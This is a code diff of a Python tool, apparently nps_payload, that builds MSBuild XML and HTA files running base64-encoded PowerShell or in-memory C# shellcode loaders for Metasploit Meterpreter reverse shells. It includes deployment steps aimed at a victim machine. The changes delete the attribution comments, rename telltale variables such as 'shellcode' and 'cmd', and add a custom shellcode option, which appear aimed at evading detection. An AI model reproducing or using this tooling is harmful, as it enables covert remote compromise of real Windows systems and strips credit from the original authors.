@@ -116,11 +116,6 @@ def generate_msbuild_nps_msf_payload():
   # Create msbuild_nps.xml
   msbuild_nps_file = open("msbuild_nps.xml", "w")
   msbuild_nps_file.write("""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <!-- This inline task executes c# code. -->
-  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->
-  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
-  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
-  <!-- License: BSD 3-Clause -->
   <Target Name="npscsharp">
    <nps />
   </Target>
@@ -143,10 +138,10 @@ def generate_msbuild_nps_msf_payload():
         {
             public override bool Execute()
             {
-                string cmd = "%s";
+                string xnx = "%s";
 
                 PowerShell ps = PowerShell.Create();
-                ps.AddScript(Base64Decode(cmd));
+                ps.AddScript(Base64Decode(xnx));
 
                 Collection<PSObject> output = null;
                 try
@@ -181,7 +176,7 @@ def generate_msbuild_nps_msf_payload():
   </UsingTask>
 </Project>""" % psh_payload)
 
-  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")  
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")
   print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Payload written to msbuild_nps.xml")
   print("\n1. Run \"" + bcolors.WHITE + "msfconsole -r msbuild_nps.rc" + bcolors.ENDC + "\" to start listener.")
   print("2. Choose a Deployment Option (a or b): - See README.md for more information.")
@@ -251,11 +246,11 @@ public class ClassExample
     private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
     public void Execute() {
         string raw = @"%s";
-        byte[] shellcode = Convert.FromBase64String(xorIt("%s", Base64Decode(raw)));
-        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
-        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+        byte[] sc = Convert.FromBase64String(xorIt("%s", Base64Decode(raw)));
+        UInt32 funcAddr = VirtualAlloc(0, (UInt32)sc.Length, MEM_COMMIT, PAGE_READWRITE);
+        Marshal.Copy(sc, 0, (IntPtr)(funcAddr), sc.Length);
         UInt32 oldProtect;
-        VirtualProtect((IntPtr)(funcAddr), (UInt32)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+        VirtualProtect((IntPtr)(funcAddr), (UInt32)sc.Length, PAGE_EXECUTE_READ, out oldProtect);
         IntPtr hThread = IntPtr.Zero;
         UInt32 threadId = 0;
         IntPtr pinfo = IntPtr.Zero;
@@ -303,31 +298,30 @@ def generate_msbuild_nps_msf_csharp_payload():
   print("\n\t(1)\twindows/meterpreter/reverse_tcp")
   print("\t(2)\twindows/meterpreter/reverse_http")
   print("\t(3)\twindows/meterpreter/reverse_https")
+  print("\t(4)\tCustom raw shellcode")
 
   options = {1: "windows/meterpreter/reverse_tcp",
              2: "windows/meterpreter/reverse_http",
-             3: "windows/meterpreter/reverse_https"
-  }
+             3: "windows/meterpreter/reverse_https",
+			 4: "Custom raw shellcode"
+    }
 
   # Generate payload
   try:
     msf_payload = input("\nSelect payload: ")
-    generate_msfvenom_raw_payload(options.get(msf_payload))
-    encode_csharppayload("shell.raw")
-
+    if options.get(msf_payload) == "Custom raw shellcode":
+        custom_payload = raw_input("\n\tLocation of payload: ")
+        encode_csharppayload(custom_payload)
+    else:
+        generate_msfvenom_raw_payload(options.get(msf_payload))
+        encode_csharppayload("shell.raw")
   except KeyError:
     pass
 
   # Create msbuild_nps.xml
   msbuild_nps_file = open("msbuild_nps.xml", "w")
   msbuild_nps_file.write("""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <!-- This inline task executes c# code. -->
-  <!-- C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe nps.xml -->
-  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
-  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
-  <!-- Created C# payload: Franci Sacer, Twitter: @francisacer1 -->
-  <!-- License: BSD 3-Clause -->
-  <Target Name="npscsharp">
+  <Target Name="sharpie">
    <nps />
   </Target>
   <UsingTask
@@ -353,8 +347,8 @@ def generate_msbuild_nps_msf_csharp_payload():
         {
             public override bool Execute()
             {
-                Console.WriteLine("hey");
-                string cmd = "%s";
+                Console.WriteLine("done");
+                string xnx = "%s";
                 CSharpCodeProvider nps = new CSharpCodeProvider();
                 CompilerParameters parameters = new CompilerParameters();
                 parameters.ReferencedAssemblies.Add("System.dll");
@@ -362,7 +356,7 @@ def generate_msbuild_nps_msf_csharp_payload():
                 parameters.GenerateExecutable = false;
                 parameters.GenerateInMemory = true;
                 parameters.IncludeDebugInformation = false;
-                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
+                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(xnx));
                 Assembly assembly = results.CompiledAssembly;
                 object obj = assembly.CreateInstance("ClassExample");
                 obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
@@ -383,7 +377,7 @@ def generate_msbuild_nps_msf_csharp_payload():
   </UsingTask>
 </Project>""" % csharp_payload)
 
-  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")  
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")
   print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Payload written to msbuild_nps.xml")
   print("\n1. Run \"" + bcolors.WHITE + "msfconsole -r msbuild_nps.rc" + bcolors.ENDC + "\" to start listener.")
   print("2. Choose a Deployment Option (a or b): - See README.md for more information.")
@@ -571,7 +565,7 @@ def generate_msbuild_nps_msf_hta_payload():
   End Function
 </script>""" % psh_payloads)
 
-  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")  
+  print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Metasploit resource script written to msbuild_nps.rc")
   print(bcolors.GREEN + "[+]" + bcolors.ENDC + " Payload written to msbuild_nps.hta")
   print("\n1. Run \"" + bcolors.WHITE + "msfconsole -r msbuild_nps.rc" + bcolors.ENDC + "\" to start listener.")
   print("2. Deploy hta file to web server and navigate from the victim machine.")
